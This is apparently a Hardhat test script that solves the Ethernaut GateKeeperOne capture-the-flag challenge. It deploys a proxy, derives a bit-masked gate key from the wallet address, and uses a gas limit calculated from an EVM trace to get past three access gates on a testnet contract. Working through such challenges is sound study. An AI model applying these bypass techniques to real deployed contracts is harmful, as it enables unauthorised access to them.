import { ethers } from "hardhat";
import { expect } from "chai";


describe("gatekeeperone", function() {
    it("should solve GateKeeperOne challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function entrant() public view returns (address)",
        ];

        const targetAddr = "0x184C2B49205eA83630Cf1075de72A63A808b23F3";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);
        
        // gateone is ok (tx.origin != msg.sender)
        const proxyFactory = await ethers.getContractFactory("GKOProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr);
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        console.log("ReProxy deployed at: " + proxyCont.address);

        /*
        * gatetwo
        * uint casting gets the least significant bytes if value is bigger (does not fit) 
        * need to provide excat size for bytes8 argument
        * console.log from test contract 
        * 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        * 0x5500000000002266
        * uint32(uint64(_gateKey)): 8806
        * uint16(uint64(_gateKey))): 8806
        * uint64(_gateKey): 6124895493223883366
        */

        let gateKey = "0x550000000000" + eoa.address.slice(-4);
        console.log(eoa.address);
        console.log(gateKey);

        // gatethree
        /* How I calculated this value
        * I found the instruction(s) matching gasLimit funciton on Remix. Which is "GAS"
        * Since I used Remix Debugger, I had to do it on javascript evm. Debugger did not work properly
        * on Rinkeby for some reason. (Might be because it is Alpha yet). 
        * Then I initiated a transaction on rinkeby with a random limit like 555555.
        * Then find the GAS instruction on geth_trace of etherscan.
        * GAS instruction returns the remaning GAS after it is execution (GAS instruction's gas olsa included)
        * [330]	298	GAS	548797	2	2
        * [331]	299	PUSH2	548795	
        * So remaning gas after the GAS instruction is the value which gasLeft function returns.
        * Then I calculated the correct gas limit by the formula 555555 - (548795 % 8191)
        */
       
        const gate2gas = 549051;

        let tx = await proxyCont.attack(gateKey, gate2gas, { gasLimit: 1000000});
        await tx.wait();
        console.log(tx);

        const entrant = await targetCont.entrant();
        expect(entrant).to.eq(eoa.address);
    });
});